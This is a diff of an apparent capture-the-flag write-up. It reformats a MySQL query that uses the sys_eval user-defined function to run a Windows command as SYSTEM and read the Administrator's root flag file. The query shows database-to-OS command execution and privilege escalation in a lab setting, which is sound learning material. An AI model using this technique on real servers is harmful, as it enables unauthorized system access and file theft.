@@ -252,10 +252,7 @@ NT AUTHORITY\SYSTEM
 With SYSTEM-level command execution, the root flag was retrieved:
 
 ~~~sql
-SELECT CONVERT(
-    sys_eval('type C:\Users\Administrator\Desktop\root.txt')
-    USING utf8mb4
-) AS root_flag;
+SELECT CONVERT(sys_eval('type C:\Users\Administrator\Desktop\root.txt')USING utf8mb4) AS root_flag;
 ~~~
 
 This completed the privilege escalation and provided the root flag.
